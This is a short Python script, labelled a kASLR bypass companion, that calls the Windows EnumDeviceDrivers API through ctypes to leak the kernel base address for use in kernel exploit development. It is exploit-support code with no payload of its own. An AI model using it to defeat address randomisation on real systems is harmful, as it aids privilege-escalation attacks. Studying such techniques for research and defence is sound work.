"""
Description: kASLR Bypass Companion Script
Author: Cody Winkler
Contact: @cwinfosec (twitter)
Date: 11/5/2023
"""
import ctypes
import struct
import array
import time

from subprocess import Popen

from ctypes import *

# Load libraries
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi

# EnumDeviceDrivers function signature
EnumDeviceDrivers = psapi.EnumDeviceDrivers
EnumDeviceDrivers.argtypes = [
	ctypes.POINTER(ctypes.c_void_p),			# *lpImageBase
	ctypes.c_uint,						# cb
	ctypes.POINTER(ctypes.c_uint)]				# lpcbNeeded
EnumDeviceDrivers.restype = ctypes.c_bool


def get_kernel_base():
    # You can now call EnumDeviceDrivers using this function
    buffer_size = 1024  # adjust the buffer size accordingly
    lpImageBase = (ctypes.c_void_p * buffer_size)()
    lpcbNeeded = ctypes.c_uint()

    success = EnumDeviceDrivers(lpImageBase, ctypes.sizeof(lpImageBase), ctypes.byref(lpcbNeeded))

    if not success:
        # Handle the error, e.g., print an error message or raise an exception
        print("Error calling EnumDeviceDrivers")
        return None

    # Extract the list of device drivers from the lpImageBase array
    drivers = [lpImageBase[i] for i in range(buffer_size) if lpImageBase[i] != None]

    return drivers[0]

if __name__ in "__main__":
	get_kernel_base()
